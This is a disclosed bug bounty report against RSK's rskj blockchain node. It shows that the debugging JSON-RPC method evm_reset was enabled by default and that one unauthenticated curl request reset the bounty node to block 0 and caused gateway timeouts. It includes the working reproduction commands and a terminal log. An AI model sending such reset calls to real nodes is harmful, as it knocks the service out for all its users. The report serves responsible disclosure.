# JSON RPC methods for debugging enabled by default allow DoS

## Report Details
- **Report ID**: 324021
- **URL**: https://hackerone.com/reports/324021
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-03-09T23:59:41.881Z
- **Disclosed**: 2023-02-27T18:27:22.912Z

## Reporter
- **Username**: teknogeek
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rootstocklabs

## Vulnerability Information
**Summary:** Upon sending the JSON-RPC the `evm_reset` command, the RPC server hung, has gone slow, and is now on block 0.

**Description:** While testing the bounty RPC node, I was sending a variety of available commands I noticed in the source code. After sending the `evm_reset` command, the server hung, began responding slowly, started returning `504 Gateway Time-out`'s, and is now synced to block 0.

## Steps To Reproduce:

1. Run `curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_blockNumber", "params": {}, "id":1337}' https://bounty-node.rsk.co` and observe the block number
2. Run `curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_reset", "params": {}, "id":1337}' https://bounty-node.rsk.co`
3. Response should hang

## Supporting Material/References:
Below are snippets from my terminal session while I discovered this issue:

```
# teknogeek at teknogeek-mbp in ~/Documents/BugBounties/HackerOne/RSK/rskj on git:6e45eaf6 ✖︎ [18:14:19]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_blockNumber", "params": [], "id":1337}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":1337,"result":"0x437ca"}

# teknogeek at teknogeek-mbp in ~/Documents/BugBounties/HackerOne/RSK/rskj on git:6e45eaf6 ✖︎ [18:29:37]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_snapshot", "params": {}, "id":666}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":666,"result":"0x1"}

# teknogeek at teknogeek-mbp in ~/Documents/BugBounties/HackerOne/RSK/rskj on git:6e45eaf6 ✖︎ [18:35:46]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_snapshot", "params": {}, "id":666}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":666,"result":"0x2"}

# teknogeek at teknogeek-mbp in ~/Documents/BugBounties/HackerOne/RSK/rskj on git:6e45eaf6 ✖︎ [18:35:52]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_reset", "params": {}, "id":666}' https://bounty-node.rsk.co


^C
# teknogeek at teknogeek-mbp in ~ [18:41:34]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"web3_clientVersion", "params": {}, "id":1337}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":1337,"result":"RskJ/0.4.0/Linux/Java1.8/BAMBOO-1192882"}

# teknogeek at teknogeek-mbp in ~ [18:41:37]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"web3_clientVersion", "params": {}, "id":1337}' https://bounty-node.rsk.co
<html>
<head><title>504 Gateway Time-out</title></head>
<body bgcolor="white">
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx</center>
</body>
</html>

# teknogeek at teknogeek-mbp in ~ [18:45:27]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_blockNumber", "params": [], "id":1337}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":1337,"result":"0x0"}
```

I also tested from multiple locations (VPS and locally) to confirm that this was not just a IP blacklist or connectivity issue on my end.

## Impact

Loss of service and responsiveness to all users

## Attachments
No attachments
